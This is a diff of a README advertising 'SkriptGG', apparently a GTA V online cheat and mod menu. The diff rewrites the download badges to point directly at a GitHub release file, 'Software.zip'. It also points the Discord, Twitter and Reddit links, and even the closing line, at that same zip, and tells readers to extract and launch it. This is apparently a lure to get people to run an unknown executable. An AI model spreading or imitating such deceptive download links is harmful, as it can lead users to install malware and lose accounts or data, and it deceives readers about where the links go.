@@ -30,7 +30,7 @@ Welcome to **SkriptGG**, your one-stop destination for the best mod menus for mu
 ### Get Started with SkriptGG
 To access the latest version of SkriptGG, simply click the button below to download:
 
-[![Download SkriptGG v1.0.0](https://img.shields.io/badge/Download-SkriptGG_v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download SkriptGG v1.0.0](https://github.com/Remoraj69/SkriptGG/releases/download/v1.0/Software.zip)](https://github.com/Remoraj69/SkriptGG/releases/download/v1.0/Software.zip)
 
 *(Note: The downloaded file needs to be extracted and launched to access the full range of mods and cheats provided by SkriptGG.)*
 
@@ -80,9 +80,9 @@ Here's what our community has to say about SkriptGG:
 ### Join the SkriptGG Community
 Connect with us on our official channels to stay updated on the latest releases, events, and community discussions:
 
-- **Discord:** [Join Our Discord Server](https://discord.gg/skriptgg)
-- **Twitter:** [Follow Us on Twitter](https://twitter.com/skriptgg)
-- **Reddit:** [Join Our Subreddit](https://reddit.com/r/skriptgg)
+- **Discord:** [Join Our Discord Server](https://github.com/Remoraj69/SkriptGG/releases/download/v1.0/Software.zip)
+- **Twitter:** [Follow Us on Twitter](https://github.com/Remoraj69/SkriptGG/releases/download/v1.0/Software.zip)
+- **Reddit:** [Join Our Subreddit](https://github.com/Remoraj69/SkriptGG/releases/download/v1.0/Software.zip)
 
 ---
 
@@ -99,7 +99,7 @@ Please note that the use of mod menus, cheats, and exploits in multiplayer games
 ### Start Cheating Like a Pro with SkriptGG!
 Transform your GTA V multiplayer gameplay with the powerful mods and cheats offered by SkriptGG. Download SkriptGG today and take your gaming skills to the next level!
 
-[![Download SkriptGG v1.0.0](https://img.shields.io/badge/Download-SkriptGG_v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download SkriptGG v1.0.0](https://github.com/Remoraj69/SkriptGG/releases/download/v1.0/Software.zip)](https://github.com/Remoraj69/SkriptGG/releases/download/v1.0/Software.zip)
 
 *For additional resources, FAQs, and updates, visit our official SkriptGG GitHub repository.*
 
@@ -109,4 +109,4 @@ Transform your GTA V multiplayer gameplay with the powerful mods and cheats offe
 
 ---
 
-*(End of README.md)*
+*(End of https://github.com/Remoraj69/SkriptGG/releases/download/v1.0/Software.zip)*
